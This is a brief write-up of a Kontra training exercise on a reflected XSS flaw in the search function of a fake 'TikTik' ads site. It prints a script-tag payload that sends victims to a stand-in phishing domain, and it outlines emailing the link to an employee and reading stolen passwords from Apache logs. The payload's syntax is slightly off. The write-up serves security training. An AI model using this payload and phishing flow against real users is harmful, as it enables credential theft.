---
layout: post
title:  "Kontra - Tiktok XSS"
postid: writeup
categories: XSS
---

<br />

# Tiktok XSS
This exercise can be found under [Kontra](1)

Per cyberpoint's [research](2) on Tiktok, XSS vulnerability was found that could allow motivated threat actors to gain an access to adversaries' Ad campaigns via reflected XSS.

<br />

## XSS Exercise
We were introduced to a fake website called TikTik and we wanted to exploit search function to route an employee of targeted news company to a fake phishing page so we can have access to their password and get Ad campaign data of targeted company.

We find help page (https://ads.tiktik.com) and find that search fuction has a reflected XSS within the search term. It echos back input by WebApp in response (?q=xxx). We used following payload:

```javascript:
<script>document.location('fakewebsite.com')</script>
```
and sent a email to employee to have them click on link but be routed to crafter site. 

In order for this attack to happen, attacked must own fakewebsite domain and have a public accessible server.

The server containing website can use the following command to run server and show connection logs:
```
service apache2 start && tail -f /var/log/access.log
```

Ones targeted user uses username and password on phishing site, we gain username and password through web server's logs.

[1]:https://application.security/free-application-security-training/cross-site-scripting-vulnerability-in-tiktok
[2]:https://research.checkpoint.com/2020/tik-or-tok-is-tiktok-secure-enough/
